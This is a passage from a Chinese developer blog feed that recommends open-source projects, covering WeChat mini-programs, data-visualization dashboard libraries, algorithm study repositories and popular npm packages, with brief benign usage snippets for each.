src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662190381-f5c837e5-7a25-4194-af14-bb60b7e99725.png?x-oss-process=image/resize,w_620,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662190381-f5c837e5-7a25-4194-af14-bb60b7e99725.png?x-oss-process=image/resize,w_620,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Airmole/ShellBox">https://github.com/Airmole/ShellBox</a><br /><strong>校园小情书</strong><br />校园小情书微信小程序，通过了前端和后端完整代码。具有表白墙、树洞、校园论坛、步数旅行、漫画脸、情侣脸、今日话题等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662273120-3589d577-d55e-465d-8092-4e21e43862c0.png?x-oss-process=image/resize,w_1873,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662273120-3589d577-d55e-465d-8092-4e21e43862c0.png?x-oss-process=image/resize,w_1873,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/oubingbing/school_wechat">https://github.com/oubingbing/school_wechat</a><br /><strong>租房平台</strong><br />租房平台类微信小程序，基于 Cloud Base（TCB）云开发，小程序端集成了管理后台。用户可以发布新房、二手房、租房等委托，中介机构审核发布、推荐，客户挑好房子后可以直接中介或者房源发布者，小程序带完整的管理员后台。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662699295-2007571f-881c-447f-b7bd-76e1067efde3.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662699295-2007571f-881c-447f-b7bd-76e1067efde3.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/lx164/house">https://github.com/lx164/house</a><br /><strong>仿网易云音乐</strong><br />基于 taro + taro-ui + redux + react-hooks + typescript 开发的网易云音乐小程序，taro3 已升级完毕。项目支持用户登录、退出、关注列表、动态列表、粉丝列表、推荐歌单、推荐电台、歌词滚动、切换歌曲、喜欢音乐、搜索、视频播放等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663301128-893bd44e-642f-49b5-abd0-32c6e08c9841.png?x-oss-process=image/resize,w_553,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663301128-893bd44e-642f-49b5-abd0-32c6e08c9841.png?x-oss-process=image/resize,w_553,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/lsqy/taro-music">https://github.com/lsqy/taro-music</a><br /><strong>在线借书平台</strong><br />在线借书平台微信小程序：连接读者与图书馆的借书平台、读者的图书资料库与书单系统。30+ 页面，多个可复用组件，微信小程序开发入门。提供本地 mock server 解决方案。</p><p>除此之外，还提供了使用 Taro 重构后的版本，仅包含三个示例页面。面向人群主要是 Taro&#x2F;React&#x2F;Redux 的初学者，目的是提供一个简单的实践项目，帮助理解 Taro 与 Redux 的配合方式与 Taro 的基本使用。技术栈：Taro + Taro UI + Redux + Webpack + ES6 + Mock</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662761238-8892eee0-db8c-421e-8b32-4061d28c3416.png?x-oss-process=image/resize,w_709,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672662761238-8892eee0-db8c-421e-8b32-4061d28c3416.png?x-oss-process=image/resize,w_709,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><br />●<strong>普通版：</strong><a href="https://github.com/imageslr/weapp-library">https://github.com/imageslr/weapp-library</a><br />●<strong>Taro 版</strong>：<a href="https://github.com/imageslr/taro-library">https://github.com/imageslr/taro-library</a><br /><strong>商城营销组件</strong><br />一套简单、易用、业务化的商城营销组件库，让开发变得更简单。其提供了大转盘、红包雨、九宫格翻牌、老虎机、微信小程序分享(转发好友&#x2F;分享图)、Tab 滚动导航、滚动数字等组件。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663019017-514657e2-1499-4cc4-95ec-a9f274c5eaac.png?x-oss-process=image/resize,w_711,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663019017-514657e2-1499-4cc4-95ec-a9f274c5eaac.png?x-oss-process=image/resize,w_711,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/sunniejs/sol-weapp/">https://github.com/sunniejs/sol-weapp/</a><br /><strong>在线考试系统</strong><br />学之思开源考试系统是一款前后端分离的考试系统。主要优点是开发、部署简单快捷、界面设计友好、代码结构清晰。支持 web 端和微信小程序，能覆盖到 pc 机和手机等设备。 支持多种部署方式：集成部署、前后端分离部署、docker 部署。</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663608600-58af1a4a-0b2f-4208-80c2-42cb4d775512.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663608600-58af1a4a-0b2f-4208-80c2-42cb4d775512.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/mindskip/xzs">https://github.com/mindskip/xzs</a><br /><strong>WeHalo 博客</strong><br />WeHalo 是配合 Halo 轻快，简洁，功能强大的博客系统而开发出来的简约风 微信小程序版博客。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663476079-aceb7751-406a-4c26-a99a-4893f5e02cc9.png?x-oss-process=image/resize,w_490,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/png/1500604/1672663476079-aceb7751-406a-4c26-a99a-4893f5e02cc9.png?x-oss-process=image/resize,w_490,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/savingrun/WeHalo">https://github.com/savingrun/WeHalo</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据可视化大屏项目</title>
      <link href="/2023/06/30/frontend/collection/projects/shu-ju-ke-shi-hua-da-ping-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/shu-ju-ke-shi-hua-da-ping-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>DataV</strong><br />DataV 是一个基于 Vue 的数据可视化组件库，Vue 数据可视化组件库（类似阿里 DataV，大屏数据展示），提供 SVG 的边框及装饰、图表、水位图、飞线图等组件，简单易用，长期更新。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660671923273-4a7155fd-5907-48d2-9c2e-54ec04013c54.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660671923273-4a7155fd-5907-48d2-9c2e-54ec04013c54.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github</strong>：<a href="https://github.com/DataV-Team/DataV">https://github.com/DataV-Team/DataV</a><br /><strong>DataV-React</strong><br />DataV-React 是一个基于<strong>React</strong>的数据可视化组件库(类似阿里 DataV，大屏数据展示），提供 SVG 的边框及装饰、图表、水位图、飞线图等组件，简单易用，长期更新。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672023603-1f39cde4-3c10-4066-aacb-dad3ad46c1c0.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672023603-1f39cde4-3c10-4066-aacb-dad3ad46c1c0.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github</strong>：<a href="https://github.com/DataV-Team/DataV-React">https://github.com/DataV-Team/DataV-React</a><br /><strong>iDataV</strong><br />大屏数据可视化案例。包含了很多现成的模板，可在这些不同风格的模板基础上快速开始一个可视化大屏项目。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672175589-166430e4-bceb-4836-9179-423619ed0edc.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672175589-166430e4-bceb-4836-9179-423619ed0edc.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github</strong>：<a href="https://github.com/yyhsong/iDataV">https://github.com/yyhsong/iDataV</a><br /><strong>DataEase</strong><br />DataEase 是开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势，从而实现业务的改进与优化。DataEase 支持丰富的数据源连接，能够通过拖拉拽方式快速制作图表，并可以方便的与他人分享。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672281042-9ba04119-d9b9-41c5-82ee-3a0a21d9245b.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672281042-9ba04119-d9b9-41c5-82ee-3a0a21d9245b.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github</strong>：<a href="https://github.com/dataease/dataease">https://github.com/dataease/dataease</a><br /><strong>FlyFish</strong><br />飞鱼（FlyFish）是一个数据可视化编码平台。通过简易的方式快速创建数据模型，通过拖拉拽的形式，快速生成一套数据可视化解决方案。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672328891-8813e8ee-a13d-4fb1-9efd-68ffb56d3d5d.png?x-oss-process=image/resize,w_704,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672328891-8813e8ee-a13d-4fb1-9efd-68ffb56d3d5d.png?x-oss-process=image/resize,w_704,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github</strong>：<a href="https://github.com/CloudWise-OpenSource/FlyFish">https://github.com/CloudWise-OpenSource/FlyFish</a><br /><strong>GoView</strong><br />GoView 是一个高效的拖拽式低代码数据可视化开发平台，将图表或页面元素封装为基础组件，无需编写代码即可制作数据大屏，减少心智负担。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672578323-e9e8e635-5959-4e27-8e19-9cd7a9713de5.png?x-oss-process=image/resize,w_851,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672578323-e9e8e635-5959-4e27-8e19-9cd7a9713de5.png?x-oss-process=image/resize,w_851,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Gitee</strong>：<a href="https://gitee.com/MTrun/go-view">https://gitee.com/MTrun/go-view</a><br /><strong>vue-big-screen</strong><br />一个基于 Vue、Datav、Echart 框架的 “ <strong>数据大屏项目</strong> “，通过 Vue 组件实现数据动态刷新渲染，内部图表可实现自由替换。部分图表使用 DataV 自带组件，可进行更改，</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672557887-85eb9700-1943-4347-afa4-dc3039bf1623.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672557887-85eb9700-1943-4347-afa4-dc3039bf1623.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Gitee：</strong><a href="https://gitee.com/MTrun/big-screen-vue-datav">https://gitee.com/MTrun/big-screen-vue-datav</a><br /><strong>react-big-screen</strong><br />一个基于 React、Dva、DataV、ECharts 框架的 “ <strong>数据大屏项目</strong> “。支持数据动态刷新渲染、屏幕适配、数据请求模拟、局部样式、图表自由替换&#x2F;复用等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672637487-cbae8f03-a5af-43d6-8d15-e838f37151d0.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660672637487-cbae8f03-a5af-43d6-8d15-e838f37151d0.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Gitee：</strong><a href="https://gitee.com/MTrun/react-big-screen">https://gitee.com/MTrun/react-big-screen</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 可视化大屏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/2023/06/30/frontend/collection/projects/shu-ju-jie-gou-yu-suan-fa/"/>
      <url>/2023/06/30/frontend/collection/projects/shu-ju-jie-gou-yu-suan-fa/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>LeetCode Master</strong><br />代码随想题录，LeetCode 刷题攻略，200 道经典刷题顺序，共 60w 字的详细指导图解，视频难点剖析，50 余张思维图，支持 C++，Java，Python，Go，JavaScript 等多语言版本。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061577592-b470e3b9-1a8d-47e7-bb87-c616143e1d22.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061577592-b470e3b9-1a8d-47e7-bb87-c616143e1d22.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️32.8k）：</strong><a href="https://github.com/youngyangyang04/leetcode-master">https://github.com/youngyangyang04/leetcode-master</a><br /><strong>JavaScript 算法和数据结构</strong><br />Github 上最火的 JavaScript 描述的算法和数据结构项目，每种算法和数据结构都有自己的 README，包含相关说明和链接，提供了中文版本。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667060668095-4dd470c4-2e55-4844-a5d8-783e3ad1e119.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667060668095-4dd470c4-2e55-4844-a5d8-783e3ad1e119.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️154k）：</strong><a href="https://github.com/trekhleb/javascript-algorithms">https://github.com/trekhleb/javascript-algorithms</a><br /><strong>Algorithm Visualizer</strong><br />Algorithm Visualizer 是一个交互式在线平台，可以从代码中可视化算法。目前支持的算法包括回溯法、加密算法、动态规划、图搜索、贪婪算法、搜索算法、排序算法等。当选择算法时，中间就会动态演示执行过程，日志输出区记录每一步的执行结果。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667060905004-3c3f9422-3829-4ce6-abc4-d6971646846f.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667060905004-3c3f9422-3829-4ce6-abc4-d6971646846f.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️39.3k）：</strong><a href="https://github.com/algorithm-visualizer/algorithm-visualizer">https://github.com/algorithm-visualizer/algorithm-visualizer</a><br /><strong>Leetcode</strong><br />本项目包含 LeetCode、《剑指 Offer（第 2 版）》、《剑指 Offer（专项突击版）》、《程序员面试金典（第 6 版）》等题目的相关题解。所有题解均由多种编程语言实现，包括但不限于：Java、Python、C++、Go、TypeScript、Rust。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061830304-77b63fc8-88e9-4922-8b2c-1fed2ec13abc.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061830304-77b63fc8-88e9-4922-8b2c-1fed2ec13abc.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️32.8k）：</strong><a href="https://github.com/doocs/leetcode">https://github.com/doocs/leetcode</a><br /><strong>LeetCode JavaScript</strong><br />前端攻城狮从零入门算法的宝藏题库，根据知名算法老师的经验总结了 100+ 道 LeetCode 力扣的经典题型 JavaScript 题解和思路。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061908091-664e89ae-876b-4be6-a36c-07f67575b12c.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667061908091-664e89ae-876b-4be6-a36c-07f67575b12c.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️1.6k）：</strong><a href="https://github.com/sl1673495/leetcode-javascript">https://github.com/sl1673495/leetcode-javascript</a><br /><strong>labuladong 的算法小抄</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667062225852-51aa1a67-6fc5-4ae3-a62c-2d0bf0ee8ef4.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667062225852-51aa1a67-6fc5-4ae3-a62c-2d0bf0ee8ef4.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️111k）：</strong><a href="https://github.com/labuladong/fucking-algorithm">https://github.com/labuladong/fucking-algorithm</a><br /><strong>LeetcodeTop</strong><br />codeTop 上汇总了各大互联网公司容易考察的高频 leetcode 题，支持按照公司、部门、岗位组合查询。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667062403784-9c161476-bbcf-47f8-85d3-0c55ba04511e.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1667062403784-9c161476-bbcf-47f8-85d3-0c55ba04511e.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️15.6k）：</strong><a href="https://github.com/afatcoder/LeetcodeTop">https://github.com/afatcoder/LeetcodeTop</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>热门项目</title>
      <link href="/2023/06/30/frontend/collection/projects/re-men-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/re-men-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="XIJxO"></a></p><h2 id="1-debug"><a href="#1-debug" class="headerlink" title="1. debug"></a>1. debug</h2><p>debug 是一个模仿 Node.js 核心调试技术的小型 JavaScript 调试实用程序。适用于 Node.js 和 Web 浏览器。</p><p>debug 每周下载量：<strong>195,681,684</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648828885404-4e0c0374-1f9e-4739-b84b-04ef42b5b912.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648828885404-4e0c0374-1f9e-4739-b84b-04ef42b5b912.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub</strong>：<a href="https://github.com/debug-js/debug">https://github.com/debug-js/debug</a></p><p><a name="gJRiO"></a></p><h2 id="2-chalk"><a href="#2-chalk" class="headerlink" title="2. chalk"></a>2. chalk</h2><p>chalk 是一个终端字符串美化工具。默认 node 在输出终端的文字都是黑白的，为了使输出不再单调，就可以使用这个库来添加文字背景和字体颜色。</p><p>chalk 每周下载量：<strong>180,736,619</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648829520492-24430c6e-1874-44f5-8164-0771084f8419.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648829520492-24430c6e-1874-44f5-8164-0771084f8419.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/chalk/chalk">https://github.com/chalk/chalk</a></p><p><a name="WMKwK"></a></p><h2 id="3-ms"><a href="#3-ms" class="headerlink" title="3. ms"></a>3. ms</h2><p>ms 是一个微小的毫秒转换实用程序，可以轻松地将各种时间格式转换为毫秒。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2 days&quot;</span>); <span class="comment">// 172800000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1d&quot;</span>); <span class="comment">// 86400000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;10h&quot;</span>); <span class="comment">// 36000000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2.5 hrs&quot;</span>); <span class="comment">// 9000000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2h&quot;</span>); <span class="comment">// 7200000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1m&quot;</span>); <span class="comment">// 60000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;5s&quot;</span>); <span class="comment">// 5000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1y&quot;</span>); <span class="comment">// 31557600000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;100&quot;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-3 days&quot;</span>); <span class="comment">// -259200000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-1h&quot;</span>); <span class="comment">// -3600000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-200&quot;</span>); <span class="comment">// -200</span></span><br></pre></td></tr></table></figure><p>ms 每周下载量：<strong>162,813,087</strong><br /><strong>GitHub：</strong><a href="https://github.com/vercel/ms">https://github.com/vercel/ms</a></p><p><a name="bItCu"></a></p><h2 id="4-strip-ansi"><a href="#4-strip-ansi" class="headerlink" title="4. strip-ansi"></a>4. strip-ansi</h2><p>strip-ansi 用于从字符串中去掉 ANSI 转义码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> stripAnsi <span class="keyword">from</span> <span class="string">&quot;strip-ansi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">stripAnsi</span>(<span class="string">&quot;\u001B[4mUnicorn\u001B[0m&quot;</span>); <span class="comment">//=&gt; &#x27;Unicorn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">stripAnsi</span>(<span class="string">&quot;\u001B]8;;https://github.com\u0007Click\u001B]8;;\u0007&quot;</span>); <span class="comment">//=&gt; &#x27;Click&#x27;</span></span><br></pre></td></tr></table></figure><p>strip-ansi 每周下载量：<strong>123,800,769</strong><br /><strong>GitHub：</strong><a href="https://github.com/chalk/strip-ansi">https://github.com/chalk/strip-ansi</a></p><p><a name="dwwVE"></a></p><h2 id="5-Commander"><a href="#5-Commander" class="headerlink" title="5. Commander"></a>5. Commander</h2><p>Commander.js 是 Node.js 命令行接口的补全解决方案，灵感来源于 Ruby 的 commander。它使得命令行界面变得简单。</p><p>Commander 每周下载量：<strong>90,841,947</strong></p><p><strong>GitHub：</strong><a href="https://github.com/tj/commander.js">https://github.com/tj/commander.js</a></p><p><a name="blppe"></a></p><h2 id="6-yargs"><a href="#6-yargs" class="headerlink" title="6. yargs"></a>6. yargs</h2><p>Yargs 框架通过使用 Node.js 构建功能全面的命令行应用，它能轻松配置命令，解析多个参数，并设置快捷方式等，还能自动生成帮助菜单。</p><p>yargs 每周下载量：<strong>79,505,865</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648830706613-d2f26de9-26fd-4c56-939a-c41fa736d24d.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648830706613-d2f26de9-26fd-4c56-939a-c41fa736d24d.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/yargs/yargs">https://github.com/yargs/yargs</a></p><p><a name="LxQ0R"></a></p><h2 id="7-uuid"><a href="#7-uuid" class="headerlink" title="7. uuid"></a>7. uuid</h2><p>uuid 用于在 JavaScript 中生成符合 RFC4122 的 UUID。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; v4 <span class="keyword">as</span> uuidv4 &#125; <span class="keyword">from</span> <span class="string">&quot;uuid&quot;</span>;</span><br><span class="line"><span class="title function_">uuidv4</span>(); <span class="comment">// ⇨ &#x27;9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d&#x27;</span></span><br></pre></td></tr></table></figure><p><br />uuid 每周下载量：<strong>76,317,814</strong><br /><strong>GitHub：</strong><a href="https://github.com/uuidjs/uuid">https://github.com/uuidjs/uuid</a></p><p><a name="hPSXn"></a></p><h2 id="8-p-limit"><a href="#8-p-limit" class="headerlink" title="8. p-limit"></a>8. p-limit</h2><p>p-limit 用于有限的并发运行多个 promise-returning &amp; async 函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> input = [</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">fetchSomething</span>(<span class="string">&quot;foo&quot;</span>)),</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">fetchSomething</span>(<span class="string">&quot;bar&quot;</span>)),</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">doSomething</span>()),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only one promise is run at once</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(input);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><p><br />p-limit 每周下载量：<strong>75,841,698</strong><br /><strong>GitHub：</strong><a href="https://github.com/sindresorhus/p-limit">https://github.com/sindresorhus/p-limit</a></p><p><a name="wKS1i"></a></p><h2 id="9-Ajv"><a href="#9-Ajv" class="headerlink" title="9. Ajv"></a>9. Ajv</h2><p>Ajv 是一个适用于 Node.js 和浏览器的最快 JSON 验证器。它支持 JSON Schema Draft-04&#x2F;06&#x2F;07&#x2F;2019-09&#x2F;2020-12 和 JSON 类型定义 (RFC8927)。</p><p>Ajv 每周下载量：<strong>72,378,941</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648831173065-e1d82feb-fea3-4db9-9861-4e8cdfb4b6d9.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648831173065-e1d82feb-fea3-4db9-9861-4e8cdfb4b6d9.png?x-oss-process=image/resize,w_957,limit_0" 